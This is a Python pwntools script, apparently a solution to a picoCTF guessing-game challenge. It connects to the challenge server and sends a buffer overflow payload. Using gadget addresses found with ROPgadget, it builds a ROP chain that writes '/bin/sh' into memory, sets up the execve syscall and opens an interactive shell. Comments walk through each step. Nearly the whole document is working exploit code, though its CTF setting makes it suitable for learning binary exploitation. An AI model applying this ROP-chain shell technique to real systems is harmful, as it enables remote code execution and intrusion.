'''
This challenge is solve by using ROPgadget, Objdump, gdb-pwndbg, and 
linux shell install in docker
'''

from pwn import *

p = remote("jupiter.challenges.picoctf.org",38467)

# find the lenght of the buffer
ran_str = cyclic(360)
padding = b"A"*cyclic_find("faab")

p.recvline("Welcome to my guessing game!")
p.recvline("What number would you like to guess?")
# The random number can be different. Compile the code to see what is the right answer
p.sendline("84")
p.recvline("Congrats! You win! Your prize is this print statement!")
p.recvline("New winner!")

#raw_input("attach gdb")      #uncommend this line if you want to stop before sending the payload

# Shell and shell address
bin_sh = b'/bin/sh\x00'
bin_sh_addr = p64(0x6ba130)

# these commend bellow are from ROPgardget 
'''
Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x47ff91 mov qword ptr [rsi], rax ; ret
	[+] Gadget found: 0x410ca3 pop rsi ; ret
	[+] Gadget found: 0x4163f4 pop rax ; ret
	[+] Gadget found: 0x445950 xor rax, rax ; ret

    we first write shell into rax and an empty address that we want to
    put shellcode into to rsi. Move rax into rsi by adding 0x47ff91, and then xor rax
    by adding 0x445950:
        * pop rsi ; ret + address of /bin/sh +
        * pop rax ; ret + '/bin/sh\x00' +
        * mov qword ptr [rsi], rax ; ret +
        * xor rax, rax ; ret
'''

'''
Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x400696 pop rdi ; ret
	[+] Gadget found: 0x410ca3 pop rsi ; ret
	[+] Gadget found: 0x44a6b5 pop rdx ; ret
'''

pop_rsi = p64(0x410ca3)
pop_rax = p64(0x4163f4)
pop_rdi = p64(0x400696)
pop_rdx = p64(0x44a6b5)

write_gadget = b''
# write into address in rsi
write_gadget += pop_rsi + bin_sh_addr
# put shell into rax
write_gadget += pop_rax + bin_sh
# move rax into rsi, then xor
write_gadget += p64(0x47ff91) + p64(0x445950)

'''
Step 4 -- Syscall gadget

	[+] Gadget found: 0x40137c syscall
'''
syscall = p64(0x40137c)

'''
Now we will combine everything together. 
padding will overflow the memory to where we can put shellcode.
write_gadget will perform "Write-what-where gadgets" step as show in ROPgadget to spawn the shell.
Then we will add (pop_rdi + bin_sh_addr) + pop_rsi + p64(0x0) + pop_rdx + p64(0x0) + (pop_rax + p64(0x3b)).
The order does not matter. The 0x3b is the hex value of 59 which is rax value of execve of 64bit.
Add NULL char at the end of pop rsi and pop rdx.
'''
payload = padding + write_gadget + (pop_rdi + bin_sh_addr) + pop_rsi + p64(0x0) + pop_rdx + p64(0x0) + (pop_rax + p64(0x3b)) + syscall

p.sendline(payload)

p.interactive()